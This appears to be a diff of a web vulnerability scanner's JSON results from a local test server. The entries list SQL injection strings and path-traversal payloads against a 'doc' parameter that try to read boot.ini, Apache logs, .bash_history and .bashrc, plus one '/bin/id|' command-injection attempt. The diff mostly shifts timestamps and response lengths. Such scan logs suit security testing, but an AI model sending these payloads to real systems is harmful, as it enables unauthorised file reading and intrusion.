-      "timestamp": "17:39:07",
+      "response_length": 4348,
+      "timestamp": "15:26:13",
       "confidence": 75
     },
     {
@@ -6109,8 +6077,8 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 8412,
-      "timestamp": "17:39:07",
+      "response_length": 4348,
+      "timestamp": "15:26:13",
       "confidence": 75
     },
     {
@@ -6120,8 +6088,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 8412,
-      "timestamp": "17:39:09",
+      "response_length": 4348,
+      "timestamp": "15:26:15",
       "confidence": 75
     },
     {
@@ -6131,8 +6099,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 8412,
-      "timestamp": "17:39:10",
+      "response_length": 4348,
+      "timestamp": "15:26:16",
       "confidence": 75
     },
     {
@@ -6142,8 +6110,8 @@
       "payload": "' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 8412,
-      "timestamp": "17:39:12",
+      "response_length": 4348,
+      "timestamp": "15:26:18",
       "confidence": 75
     },
     {
@@ -6153,8 +6121,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 5389,
-      "timestamp": "17:39:38",
+      "response_length": 5395,
+      "timestamp": "15:26:44",
       "confidence": 75
     },
     {
@@ -6164,8 +6132,8 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 5389,
-      "timestamp": "17:39:39",
+      "response_length": 5395,
+      "timestamp": "15:26:44",
       "confidence": 75
     },
     {
@@ -6175,8 +6143,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 5389,
-      "timestamp": "17:39:41",
+      "response_length": 5395,
+      "timestamp": "15:26:46",
       "confidence": 75
     },
     {
@@ -6186,8 +6154,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 5389,
-      "timestamp": "17:39:42",
+      "response_length": 5395,
+      "timestamp": "15:26:47",
       "confidence": 75
     },
     {
@@ -6197,96 +6165,8 @@
       "payload": "' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 5389,
-      "timestamp": "17:39:43",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "../../../../../../../../../../../../boot.ini",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:40",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "../../../../apache/logs/error.log",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:41",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "../../../apache/logs/error.log",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:41",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "../../apache/logs/error.log",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:41",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "..//..//..//..//..//boot.ini",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:42",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "../apache/logs/error.log",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:42",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/../../../../../../../../../../../boot.ini",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:43",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/../../../../../../../../bin/id|",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:43",
+      "response_length": 5395,
+      "timestamp": "15:26:49",
       "confidence": 75
     },
     {
@@ -6296,8 +6176,96 @@
       "payload": "../../../../../apache/logs/error.log",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:44",
+      "response_length": 15381,
+      "timestamp": "15:27:45",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "../../../../../../../../../../../../boot.ini",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:45",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "../../../../apache/logs/error.log",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:46",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "../../apache/logs/error.log",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:46",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "..//..//..//..//..//boot.ini",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:46",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "../apache/logs/error.log",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:47",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/../../../../../../../../../../../boot.ini",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:47",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "../../../apache/logs/error.log",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:48",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/../../../../../../../../bin/id|",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:48",
       "confidence": 75
     },
     {
@@ -6307,96 +6275,8 @@
       "payload": "/..\\../..\\../..\\../..\\../..\\../..\\../boot.ini",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:44",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/./././././././././././boot.ini",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:44",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/.bash_history",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:45",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/.bash_profile",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:45",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/.bashrc",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:45",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/0x2e0x2e0x2f0x2e0x2e0x2f{FILE}",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:46",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/0x2e0x2e0x2f{FILE}",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:46",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:47",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/instructions.php",
-      "parameter": "doc",
-      "vulnerability_type": "lfi",
-      "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:47",
+      "response_length": 15381,
+      "timestamp": "15:27:48",
       "confidence": 75
     },
     {
@@ -6406,8 +6286,96 @@
       "payload": "/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./boot.ini",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:48",
+      "response_length": 15381,
+      "timestamp": "15:27:49",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/.bash_history",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:49",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/.bash_profile",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:50",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/.bashrc",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:50",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/0x2e0x2e0x2f0x2e0x2e0x2f{FILE}",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:50",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/0x2e0x2e0x2f{FILE}",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:51",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:52",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/./././././././././././boot.ini",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:52",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "vulnerability_type": "lfi",
+      "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 15381,
+      "timestamp": "15:27:52",
       "confidence": 75
     },
     {
@@ -6417,8 +6385,8 @@
       "payload": "/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 15378,
-      "timestamp": "17:40:48",
+      "response_length": 15381,
+      "timestamp": "15:27:52",
       "confidence": 75
     }
   ],
